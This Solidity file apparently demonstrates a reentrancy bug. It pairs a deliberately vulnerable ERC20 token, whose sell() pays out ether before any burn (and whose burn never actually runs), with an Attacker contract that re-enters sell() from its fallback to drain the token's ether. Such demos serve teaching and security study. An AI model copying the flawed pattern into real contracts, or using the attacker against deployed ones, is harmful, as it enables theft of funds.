// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ReentrancyToken is ERC20 {
    constructor() ERC20("ReentrancyToken", "RET") {}

    function buy() public payable {
        require(msg.value > 0, "ether less than 0");
        _mint(msg.sender, msg.value * 1);
    }

    function sell() public {
        uint256 etherOrToken = balanceOf(msg.sender);
        require(etherOrToken > 0, "not holder");
        (bool sent, ) = msg.sender.call{value: etherOrToken}("");
        require(sent, "sell failed");
        if (balanceOf(msg.sender) > etherOrToken) {
            _burn(msg.sender, etherOrToken);
        }
    }
}

contract Attacker {
    ReentrancyToken public myToken;

    constructor(address target) {
        myToken = ReentrancyToken(target);
    }

    fallback() external payable {
        if (address(myToken).balance >= 1 ether) {
            myToken.sell();
        }
    }

    function attack() public payable {
        require(msg.value > 0, "pay some to attack");
        myToken.buy{value: msg.value}();
        myToken.sell();
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "withdraw failed");
    }
}
